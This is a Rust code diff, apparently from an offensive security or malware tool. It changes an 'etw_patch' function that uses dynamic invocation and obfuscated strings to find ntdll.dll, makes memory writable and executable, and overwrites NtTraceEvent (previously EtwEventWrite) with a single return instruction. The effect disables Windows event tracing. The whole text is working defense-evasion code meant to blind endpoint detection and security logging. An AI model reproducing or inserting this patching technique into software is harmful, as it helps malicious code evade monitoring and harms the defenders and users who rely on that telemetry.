@@ -123,13 +123,13 @@ fn etw_patch() {
     let ntdll_addr: isize = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
     if ntdll_addr != 0 {
         unsafe {
-            let etw_addr: isize = dinvoke::get_function_address(ntdll_addr, &lc!("EtwEventWrite"));
+            let etw_addr: isize = dinvoke::get_function_address(ntdll_addr, &lc!("NtTraceEvent"));
 
             let mut ret: Option<i32>;
             let current_process: HANDLE = GetCurrentProcess();
             let mut ptr_nt_protect_virtual_memory: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
             let mut base_addr: *mut c_void = etw_addr as *mut c_void;
-            let mut bytes_protect_num: usize = 4;
+            let mut bytes_protect_num: usize = 1;
             let page_exec_rw: u32 = 0x40;
             let mut old_protect: u32 = 0;
             dinvoke::dynamic_invoke!(ntdll_addr, &lc!("NtProtectVirtualMemory"), ptr_nt_protect_virtual_memory, ret, current_process, &mut base_addr, &mut bytes_protect_num, page_exec_rw, &mut old_protect);
@@ -140,12 +140,12 @@ fn etw_patch() {
                 return;
             }
             
-            let mut patch: Vec<u8> = vec![0x48,0x33,0xc0,0xc3];
+            let mut patch: Vec<u8> = vec![0xc3];
             let mut bytes_written: usize = 0;
             base_addr = etw_addr as *mut c_void;
 
             let ptr_nt_write_virtual_memory: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
-            dinvoke::dynamic_invoke!(ntdll_addr, &lc!("NtWriteVirtualMemory"), ptr_nt_write_virtual_memory, ret, current_process, base_addr, patch.as_mut_ptr() as *mut c_void, 4, &mut bytes_written);
+            dinvoke::dynamic_invoke!(ntdll_addr, &lc!("NtWriteVirtualMemory"), ptr_nt_write_virtual_memory, ret, current_process, base_addr, patch.as_mut_ptr() as *mut c_void, 1, &mut bytes_written);
 
             status = ret.unwrap() as u32;
             if status != 0 {
